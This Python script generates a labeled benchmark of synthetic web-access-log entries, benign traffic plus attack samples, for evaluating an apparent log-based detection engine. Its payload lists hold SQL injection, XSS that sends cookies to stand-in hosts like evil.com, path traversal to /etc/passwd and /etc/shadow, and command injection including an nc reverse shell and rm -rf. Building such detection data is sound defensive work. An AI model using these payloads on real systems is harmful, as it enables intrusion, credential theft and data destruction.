import time
import os
import sys
import json
import urllib.parse
from datetime import datetime, timezone, timedelta
from typing import List, Dict, Tuple

from app.parsers.factory import ParserFactory
from app.detection.engine import DetectionEngine
from app.schemas.log_event import LogEvent

def create_labeled_dataset(output_path: str = "sample_data/labeled_benchmark.json"):
    """
    Constructs a labeled dataset mixing real-world traffic with known attacks.
    Ground truth labels: 'BENIGN', 'sqli', 'xss', 'path_traversal', 'cmd_injection', 'dir_enum', 'brute_force'
    """
    entries = []
    
    # 1. Benign Traffic Samples from diverse endpoints (500 benign events)
    benign_endpoints = [
        "/", "/index.html", "/about.us", "/contact", "/products", "/categories?cat=electronics",
        "/search?q=laptop", "/images/logo.png", "/static/css/theme.css", "/static/js/bundle.js",
        "/api/v1/health", "/api/v1/status", "/blog/post/2026/05/security-updates", "/docs",
        "/cart/view", "/checkout/shipping", "/faq", "/services", "/pricing", "/favicon.ico"
    ]
    
    base_time = datetime(2026, 6, 1, 10, 0, 0, tzinfo=timezone.utc)
    
    for i in range(500):
        ep = benign_endpoints[i % len(benign_endpoints)]
        ip = f"192.168.1.{10 + (i % 200)}"
        t = base_time + timedelta(seconds=i * 2)
        ts_str = t.strftime("%d/%b/%Y:%H:%M:%S +0000")
        raw = f'{ip} - - [{ts_str}] "GET {ep} HTTP/1.1" 200 4096 "https://google.com" "Mozilla/5.0"'
        entries.append({"raw": raw, "label": "BENIGN", "category": "BENIGN"})

    # 2. SQL Injection Payloads (50 events)
    sqli_payloads = [
        "/products?id=1' UNION SELECT username,password FROM users--",
        "/search?q=admin' OR 1=1--",
        "/items?cat=books'; DROP TABLE users;--",
        "/account?user=test' UNION SELECT null,table_name FROM information_schema.tables--",
        "/api/data?id=10 OR 1=1",
        "/login?u=admin' UNION SELECT 1,2,3--",
        "/profile?id=5' WAITFOR DELAY '0:0:5'--",
        "/search?term=UNION SELECT password FROM accounts",
        "/query?val=1' AND 1=1--",
        "/view?doc=99 UNION SELECT id, credit_card FROM payments"
    ]
    for i in range(50):
        payload = sqli_payloads[i % len(sqli_payloads)]
        ip = f"45.33.32.{10 + (i % 10)}"
        t = base_time + timedelta(minutes=20, seconds=i * 5)
        ts_str = t.strftime("%d/%b/%Y:%H:%M:%S +0000")
        raw = f'{ip} - - [{ts_str}] "GET {urllib.parse.quote(payload, safe="/:?=&")} HTTP/1.1" 500 512 "-" "sqlmap/1.7"'
        entries.append({"raw": raw, "label": "ATTACK", "category": "sqli"})

    # 3. Cross-Site Scripting (XSS) Payloads (50 events)
    xss_payloads = [
        "/search?q=<script>alert('XSS')</script>",
        "/comment?msg=<img src=x onerror=alert(document.cookie)>",
        "/profile?name=<svg onload=fetch('http://attacker.com/?c='+document.cookie)>",
        "/view?ref=<iframe src='javascript:alert(1)'>",
        "/search?keyword=<body onload=alert('XSS')>",
        "/feedback?text=<script src=http://evil.com/payload.js></script>",
        "/guestbook?msg=<script>document.location='http://evil.com?c='+document.cookie;</script>",
        "/test?p=<input onfocus=alert(1) autofocus>",
        "/item?tag=<details open ontoggle=alert(1)>",
        "/forum?title=<a href='javascript:alert(1)'>click me</a>"
    ]
    for i in range(50):
        payload = xss_payloads[i % len(xss_payloads)]
        ip = f"185.220.101.{5 + (i % 10)}"
        t = base_time + timedelta(minutes=30, seconds=i * 5)
        ts_str = t.strftime("%d/%b/%Y:%H:%M:%S +0000")
        raw = f'{ip} - - [{ts_str}] "GET {urllib.parse.quote(payload, safe="/:?=&")} HTTP/1.1" 200 1024 "-" "Mozilla/5.0"'
        entries.append({"raw": raw, "label": "ATTACK", "category": "xss"})

    # 4. Path Traversal Payloads (50 events)
    traversal_payloads = [
        "/download?file=../../../../etc/passwd",
        "/include?page=../../../../etc/shadow",
        "/read?file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/view?path=../../../../boot.ini",
        "/download?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/static/files/../../../../etc/passwd",
        "/get_doc?file=../../../../../../var/log/syslog",
        "/load?template=../../conf/server.xml",
        "/view_file?f=c:\\windows\\system32\\cmd.exe",
        "/assets/images/../../../etc/passwd"
    ]
    for i in range(50):
        payload = traversal_payloads[i % len(traversal_payloads)]
        ip = f"194.26.29.{15 + (i % 10)}"
        t = base_time + timedelta(minutes=40, seconds=i * 5)
        ts_str = t.strftime("%d/%b/%Y:%H:%M:%S +0000")
        raw = f'{ip} - - [{ts_str}] "GET {payload} HTTP/1.1" 403 256 "-" "curl/7.68.0"'
        entries.append({"raw": raw, "label": "ATTACK", "category": "path_traversal"})

    # 5. OS Command Injection Payloads (50 events)
    cmd_payloads = [
        "/tools/ping?target=127.0.0.1; cat /etc/passwd",
        "/tools/lookup?host=google.com|ls -la",
        "/status?node=main; id",
        "/backup?action=run && whoami",
        "/api/export?format=csv; uname -a",
        "/exec?cmd=cat /etc/passwd",
        "/check?ip=8.8.8.8; sleep 5",
        "/admin/diag?ip=10.0.0.1 | netstat -an",
        "/test?host=127.0.0.1; nc -e /bin/sh 10.0.0.1 4444",
        "/service/restart?svc=nginx; rm -rf /tmp/data"
    ]
    for i in range(50):
        payload = cmd_payloads[i % len(cmd_payloads)]
        ip = f"91.240.118.{20 + (i % 10)}"
        t = base_time + timedelta(minutes=50, seconds=i * 5)
        ts_str = t.strftime("%d/%b/%Y:%H:%M:%S +0000")
        raw = f'{ip} - - [{ts_str}] "GET {urllib.parse.quote(payload, safe="/:?=&")} HTTP/1.1" 500 512 "-" "python-requests/2.28"'
        entries.append({"raw": raw, "label": "ATTACK", "category": "cmd_injection"})

    # 6. Directory Enumeration / Scanner Scans (50 events)
    dir_paths = [
        "/.git/config", "/.env", "/.htaccess", "/admin", "/wp-admin", "/backup.zip",
        "/phpmyadmin", "/config.php.bak", "/server-status", "/database.sql"
    ]
    # In dir_enum, scans come from specific scanner IPs hitting multiple paths
    scanner_ip = "198.51.100.99"
    for i in range(50):
        p = dir_paths[i % len(dir_paths)]
        t = base_time + timedelta(minutes=60, seconds=i * 2)
        ts_str = t.strftime("%d/%b/%Y:%H:%M:%S +0000")
        raw = f'{scanner_ip} - - [{ts_str}] "GET {p} HTTP/1.1" 404 128 "-" "gobuster/3.1.0"'
        entries.append({"raw": raw, "label": "ATTACK", "category": "dir_enum"})

    # 7. Brute Force Authentication Bursts (50 events)
    attacker_ip = "203.0.113.88"
    for i in range(50):
        t = base_time + timedelta(minutes=70, seconds=i)
        ts_str = t.strftime("%d/%b/%Y:%H:%M:%S +0000")
        raw = f'{attacker_ip} - - [{ts_str}] "POST /api/v1/auth/login HTTP/1.1" 401 128 "-" "Hydra/9.2"'
        entries.append({"raw": raw, "label": "ATTACK", "category": "brute_force"})

    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(entries, f, indent=2)
        
    print(f"Generated labeled benchmark dataset: {len(entries)} events saved to {output_path}")
    return entries

if __name__ == "__main__":
    create_labeled_dataset()
